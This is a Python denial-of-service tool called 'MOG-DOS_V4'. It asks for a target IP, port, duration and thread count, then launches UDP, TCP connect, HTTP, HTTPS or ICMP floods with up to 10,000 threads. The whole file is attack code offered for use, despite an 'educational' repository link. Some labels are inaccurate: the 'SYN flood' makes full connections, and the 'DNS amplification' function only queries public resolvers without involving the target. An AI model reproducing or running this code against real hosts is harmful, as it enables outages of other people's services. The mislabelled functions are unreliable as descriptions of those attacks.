# Made by MOG-Developing

import socket
import threading
import time
import random
import sys
import ssl
import struct

class Colors:
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BOLD = "\033[1m"
    END = "\033[0m"

BANNER = f"""{Colors.RED}
███╗   ███╗ ██████╗  ██████╗       ██████╗  ██████╗ ███████╗       ██╗   ██╗██╗  ██╗
████╗ ████║██╔═══██╗██╔════╝       ██╔══██╗██╔═══██╗██╔════╝       ██║   ██║██║  ██║
██╔████╔██║██║   ██║██║  ███╗█████╗██║  ██║██║   ██║███████╗       ██║   ██║███████║
██║╚██╔╝██║██║   ██║██║   ██║╚════╝██║  ██║██║   ██║╚════██║       ╚██╗ ██╔╝╚════██║
██║ ╚═╝ ██║╚██████╔╝╚██████╔╝      ██████╔╝╚██████╔╝███████║███████╗╚████╔╝      ██║
╚═╝     ╚═╝ ╚═════╝  ╚═════╝       ╚═════╝  ╚═════╝ ╚══════╝╚══════╝ ╚═══╝       ╚═╝{Colors.END}"""

class AttackControl:
    def __init__(self):
        self.running = True

attack_control = AttackControl()

def udp_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(65507)
    
    while time.time() < end_time and attack_control.running:
        try:
            sock.sendto(payload, (target_ip, target_port))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.close()

def tcp_syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    
    while time.time() < end_time and attack_control.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((target_ip, target_port))
            s.close()
        except:
            pass

def http_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    headers = "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
    
    while time.time() < end_time and attack_control.running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((target_ip, target_port))
            request = f"GET /?{random.randint(0,9999999)} HTTP/1.1\r\nHost: {target_ip}\r\n{headers}\r\n"
            s.send(request.encode())
            s.close()
        except:
            pass

def https_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    headers = "User-Agent: Mozilla/5.0\r\nAccept: */*\r\n"
    
    while time.time() < end_time and attack_control.running:
        try:
            context = ssl.create_default_context()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s = context.wrap_socket(s, server_hostname=target_ip)
            s.connect((target_ip, target_port))
            request = f"GET /?{random.randint(0,9999999)} HTTP/1.1\r\nHost: {target_ip}\r\n{headers}\r\n"
            s.send(request.encode())
            s.close()
        except:
            pass

def icmp_flood(target_ip, duration):
    end_time = time.time() + duration
    
    while time.time() < end_time and attack_control.running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + (b'X' * 56)
            sock.sendto(packet, (target_ip, 0))
            sock.close()
        except:
            pass

def dns_amplification(target_ip, duration):
    end_time = time.time() + duration
    dns_servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9"]
    payload = struct.pack("!H", 0x1234) + struct.pack("!H", 0x0100)
    payload += struct.pack("!H", 1) + struct.pack("!H", 0) + struct.pack("!H", 0) + struct.pack("!H", 0)
    payload += b"\x07example\x03com\x00" + struct.pack("!H", 0x0001) + struct.pack("!H", 0x0001)
    
    while time.time() < end_time and attack_control.running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for server in dns_servers:
                sock.sendto(payload, (server, 53))
            sock.close()
        except:
            pass

def start_attack(target_ip, target_port, attack_type, duration):
    if attack_type == "udp":
        udp_flood(target_ip, target_port, duration)
    elif attack_type == "tcp":
        tcp_syn_flood(target_ip, target_port, duration)
    elif attack_type == "http":
        http_flood(target_ip, target_port, duration)
    elif attack_type == "https":
        https_flood(target_ip, target_port, duration)
    elif attack_type == "icmp":
        icmp_flood(target_ip, duration)
    elif attack_type == "dns":
        dns_amplification(target_ip, duration)

def main():
    print(BANNER)
    print(f"{Colors.CYAN}MOG-DOS_V4 | MOG-Development @misterofgames_yt{Colors.END}")
    print(f"{Colors.YELLOW}PROJECT: https://github.com/MOG-Developing/DOS-ATTACK-educational{Colors.END}\n")
    
    target_ip = input(f"{Colors.GREEN}[+] Target IP: {Colors.END}")
    target_port = int(input(f"{Colors.GREEN}[+] Target Port (0 for ICMP/DNS): {Colors.END}"))
    duration = int(input(f"{Colors.GREEN}[+] Attack Duration (seconds): {Colors.END}"))
    threads = int(input(f"{Colors.GREEN}[+] Threads (1-10000): {Colors.END}"))
    
    print(f"\n{Colors.BLUE}Available Attack Methods:{Colors.END}")
    print(f"{Colors.YELLOW}1. UDP Flood")
    print("2. TCP SYN Flood")
    print("3. HTTP Flood")
    print("4. HTTPS Flood")
    print("5. ICMP Flood")
    print("6. DNS Amplification")
    choice = input(f"\n{Colors.GREEN}[+] Select Attack (1-6): {Colors.END}")
    
    attacks = {
        "1": ("udp", target_port),
        "2": ("tcp", target_port),
        "3": ("http", target_port),
        "4": ("https", target_port),
        "5": ("icmp", 0),
        "6": ("dns", 0)
    }
    
    attack_type, port = attacks.get(choice, ("udp", target_port))
    
    print(f"\n{Colors.RED}[!] Starting {attack_type.upper()} attack on {target_ip}:{port} with {threads} threads for {duration} seconds...{Colors.END}")
    
    for _ in range(threads):
        thread = threading.Thread(target=start_attack, args=(target_ip, port, attack_type, duration))
        thread.daemon = True
        thread.start()
    
    time.sleep(duration)
    attack_control.running = False
    print(f"\n{Colors.GREEN}[+] Attack completed!{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Attack stopped by user{Colors.END}")
        attack_control.running = False
        sys.exit(0)